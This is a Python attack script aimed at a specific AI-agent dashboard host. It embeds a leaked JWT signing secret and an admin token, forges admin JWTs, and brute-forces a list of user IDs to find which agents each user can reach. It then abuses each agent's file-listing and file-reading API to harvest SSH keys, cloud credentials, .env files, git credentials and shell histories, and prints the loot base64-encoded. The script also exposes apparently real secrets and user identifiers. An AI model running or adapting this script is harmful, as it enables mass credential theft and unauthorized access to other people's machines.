#!/usr/bin/env python3
# i29079: dashboard files-RPC mass harvest across all connected agents.
# Round A: membership brute -> per-agent /home/lumii recursive-ish harvest.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
T0 = time.time()
def el(): return int(time.time() - T0)
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def curl(args, timeout=25):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 12)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, token=None, bearer=None, timeout=22, maxlen=7000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if token: args += ["-H", "Cookie: session=" + token]
    if bearer: args += ["-H", "Authorization: Bearer " + bearer]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i+8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt)}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(payload):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps(payload, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def tok_for(uid, customer="aro"):
    return forge({"userId": uid, "email": "probe@x", "customer": customer, "role": "admin"})

def jload(s):
    try: return json.loads(s)
    except Exception: return None

HOME = "/home/lumii"
DIRS = [".ssh", ".aws", ".claude", ".config", ".lumii", ".gstack", ".npm", ".docker",
        "attachments", "aiagcore", ".local/share"]
FILES = [".decart.env", ".env", ".env.local", ".env.prod", ".env.dev", ".token", ".netrc",
         ".npmrc", ".gitconfig", ".git-credentials", ".bash_history", ".zsh_history", ".claude.json",
         ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config", ".ssh/known_hosts",
         ".aws/credentials", ".aws/config", ".config/gh/hosts.yml", ".docker/config.json",
         "aiagcore/.token", "aiagcore/.ids_part", "aiagcore/.ids_proj", "aiagcore/.env", "aiagcore/.ids_rev",
         "aiagcore/.ids_prog"]
SENS = re.compile(r"(tok|env|key|secr|cred|pass|id_|deploy|config|\.json|token|pem|\.rsa|ed25519|history|netrc|npmrc|secret|wallet|vault|keystore|mnemonic|ssh)", re.I)

def qp(p):
    return up.quote(p, safe="/")

def lst(aid, path, tok):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), token=tok, maxlen=9000)
    j = jload(r["body"])
    entries = []
    if isinstance(j, dict) and isinstance(j.get("entries"), list):
        entries = j["entries"]
    return r["code"], entries, r.get("len", 0), (r["body"][:200] if r["code"] != "200" else "")

def rd(aid, path, tok, maxlen=2600):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), token=tok, maxlen=maxlen)
    return r["code"], r["body"], r.get("len", 0)

def harvest(aid, uid, meta):
    tok = tok_for(uid, meta.get("customer") or "aro")
    obj = {"id": aid, "uid": uid, "name": meta.get("name"), "cust": meta.get("customer"),
           "ssh": meta.get("ssh"), "ws": meta.get("ws")}
    c, ents, ln, snip = lst(aid, HOME, tok)
    obj["ls_home"] = {"code": c, "len": ln, "snip": snip,
                      "names": [e.get("name") + ("/" if e.get("type") == "directory" else "") for e in ents]}
    ws = meta.get("ws")
    if ws and ws not in ("~", HOME, None):
        wexp = ws if ws.startswith("/") else ""
        if wexp and wexp != HOME:
            c2, e2, l2, s2 = lst(aid, wexp, tok)
            obj["ls_ws_%s" % wexp.replace("/", "_")] = {"code": c2, "len": l2, "snip": s2,
                      "names": [e.get("name") + ("/" if e.get("type") == "directory" else "") for e in e2]}
    # dir listings
    dyn = []  # (path)
    for d in DIRS:
        c, ents, ln, snip = lst(aid, HOME + "/" + d, tok)
        if c == "200":
            names = [e.get("name") + ("/" if e.get("type") == "directory" else "") for e in ents]
            obj["ls_" + d.replace("/", "_")] = {"code": c, "names": names[:60]}
            for e in ents:
                if e.get("type") == "file" and SENS.search(str(e.get("name") or "")):
                    dyn.append(HOME + "/" + d + "/" + e.get("name"))
        elif c not in ("404",):
            obj["ls_" + d.replace("/", "_")] = {"code": c, "snip": snip}
    # top-level dynamic from home entries -> if dir, already covered; if file read
    # curated reads
    reads = {}
    for f in FILES:
        c, body, ln = rd(aid, HOME + "/" + f, tok)
        if c == "200":
            j = jload(body)
            content = j.get("content") if isinstance(j, dict) else body
            reads[f] = {"code": c, "len": ln, "content": (content or "")[:2200]}
        else:
            reads[f] = {"code": c}
    # dynamic reads (dedup, cap)
    seen = set()
    n = 0
    for p in dyn:
        if p in seen: continue
        seen.add(p)
        if p in [HOME + "/" + f for f in FILES]: continue
        if n >= 14: break
        c, body, ln = rd(aid, p, tok, maxlen=2200)
        if c == "200":
            j = jload(body)
            content = j.get("content") if isinstance(j, dict) else body
            reads[p.replace(HOME + "/", "~")] = {"code": c, "len": ln, "content": (content or "")[:1800]}
            n += 1
    obj["reads"] = reads
    R("AG_" + aid, obj)

CA_FALLBACK = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "agents_meta.json"))) if os.path.isfile(os.path.join(os.path.dirname(os.path.abspath(__file__)), "agents_meta.json")) else []
# agents_meta.json is deployed alongside; may not exist -> embed fallback minimal
if not CA_FALLBACK:
    CA_FALLBACK = []

def main():
    h = call("/api/health", maxlen=1500)
    R("health", h)
    # forge sanity
    me = call("/api/auth/me", token=tok_for("usr_ZxLewKrgbRYSm7rWDtQX8"), maxlen=1200)
    R("forge_me", me)
    # fresh agent list via ADMIN_TOKEN
    aa = call("/api/admin/agents", bearer=ADMIN_TOKEN, maxlen=400000)
    agents = CA_FALLBACK
    j = jload(aa["body"])
    if isinstance(j, dict) and isinstance(j.get("agents"), list) and j["agents"]:
        agents = [{"id": a.get("id"), "name": a.get("name"), "customer": a.get("customer"),
                   "own": a.get("imOwnerUserId"), "ssh": a.get("sshUser"),
                   "ws": a.get("workspacePath"), "status": a.get("status"), "ip": a.get("ip")} for a in j["agents"]]
        R("admin_agents_fresh", {"n": len(agents)})
    else:
        R("admin_agents_fresh", {"code": aa["code"], "snip": aa["body"][:300]})
    conn = call("/api/internal/connected-agents", bearer=ADMIN_TOKEN, maxlen=8000)
    connected = []
    cj = jload(conn["body"])
    if isinstance(cj, dict) and isinstance(cj.get("connected"), list):
        connected = cj["connected"]
    R("connected", {"code": conn["code"], "n": len(connected), "ids": connected})
    online = connected if connected else [a["id"] for a in agents if a.get("status") == "running"]

    # candidate user ids
    cand = []
    seen = set()
    def add(u):
        if u and u not in seen:
            seen.add(u); cand.append(u)
    MEMBERS = ["usr_ZxLewKrgbRYSm7rWDtQX8","usr_J29JW7MJRtMJfXe2cruEq","usr_j7t9Dhq4M4obQkag5huJi",
      "usr_h84uYNEaLgbdrcGFRGRis","usr_fJUE3VqiyFrqrJzAjq6Qc","usr_KSQogo9RMCDvYPzgebFZ9",
      "usr_3HNamBngy2Xfwm4T3tzMJ","usr_2gzZoKLgRAYaFNy2Sav4v","usr_JqvejphBd2cFVLWZQmtnZ",
      "usr_SjEcavSzyWqWKeokUwig4","usr_HhQysrVvW2uhNbyMfgT5D","usr_xahbQ7FZR4NAMztJFbDJS",
      "usr_CMU92C54VpuSAXoCfbXDE","usr_wcgceRDUAJsMFPfQgVgHc","usr_tqnzWEgcPdPMUguyD5PKm",
      "usr_etAuXiJB7UYPmqtqEh5Pv","usr_5MTDkxB65hVucKyfxUaMe","usr_gQZHAztNodEAy8GCY9YEg",
      "usr_4Ya9zoJ6ckEe9b77Ev7NS","usr_HXQCzMVo79Z65gPcAqk33","usr_8jFriEhWmpZv77ApNrsPX",
      "usr_krVGWCZF2uMYQba6hLT3r","usr_f5aLpRa9uHTdXC8hWP2ag","usr_QjRMrRJnFN9BLdujE8Q4J",
      "usr_pesN8T7K6RwVfNQeoakMw","usr_mMMqdtDuyWzh6b5y9YinE","usr_WVN3ZNSJT4HMwsGgFxhCE",
      "usr_w3nRZpmKCZNGDgFDUvHjA","usr_XLBCd82JGQAbt5pttnfAw","usr_pgnckdUSgpk9iDW3WemFY",
      "usr_8WTmpJ5gAdAXJdTAAgfcs",
      "fc7d463f-4219-11f1-ac43-525400595be1","e365313c-089f-4fef-8585-5c4080e5ce47",
      "cef8ec22-4906-11f1-ac43-525400595be1","af0a2285-490f-11f1-ac43-525400595be1",
      "4509e957-4909-11f1-ac43-525400595be1","fc7c3730-4219-11f1-ac43-525400595be1",
      "fc7c871e-4219-11f1-ac43-525400595be1","4509f57e-4909-11f1-ac43-525400595be1",
      "bc09d9cc-63b0-11f1-ac43-525400595be1","4b4f439e-74f7-11f1-ac43-525400595be1"]
    for u in MEMBERS: add(u)
    for a in agents: add(a.get("own"))
    # brute membership: for each candidate uid, list agents
    memb = {}   # aid -> uid (first found)
    per_uid = {}
    for u in cand:
        if el() > 900:  # stop brute after 15 min
            break
        tok = tok_for(u)
        r = call("/api/agents/list", token=tok, maxlen=40000)
        ids = []
        jj = jload(r["body"])
        if isinstance(jj, list):
            ids = [x.get("id") for x in jj if isinstance(x, dict)]
        per_uid[u] = {"code": r["code"], "ids": ids}
        for aid in ids:
            if aid and aid not in memb:
                memb[aid] = u
    R("MEMBERSHIP", {"per_uid": per_uid, "memb": memb})

    # harvest priority order
    byid = {a["id"]: a for a in agents}
    prio = ["agent-10718fda", "agent-0cf829f4", "agent-047f1d22", "agent-03d6cf98",
            "agent-8c6ac8b3", "agent-6c5c1781", "agent-tianyue-62f7fe42"]
    order = []
    for x in prio:
        if x in online: order.append(x)
    for x in online:
        if x not in order: order.append(x)
    done = 0
    blocked = []
    for aid in order:
        if el() > 1450:
            R("BUDGET_STOP", {"elapsed": el(), "remaining": order[done:]})
            break
        uid = memb.get(aid) or (byid.get(aid, {}) or {}).get("own")
        meta = byid.get(aid, {"id": aid})
        if not uid:
            blocked.append(aid)
            R("BLOCKED_NOMEMBER", {"id": aid, "name": meta.get("name"), "cust": meta.get("customer")})
            continue
        try:
            harvest(aid, uid, meta)
        except Exception as e:
            R("HARVEST_ERR_" + aid, repr(e))
        done += 1
    R("DONE", {"elapsed": el(), "harvested": done, "blocked_no_member": blocked})

try:
    main()
except Exception:
    import traceback
    R("FATAL", traceback.format_exc()[-3000:])
finally:
    R("END", {"elapsed": el()})
    sys.exit(1)
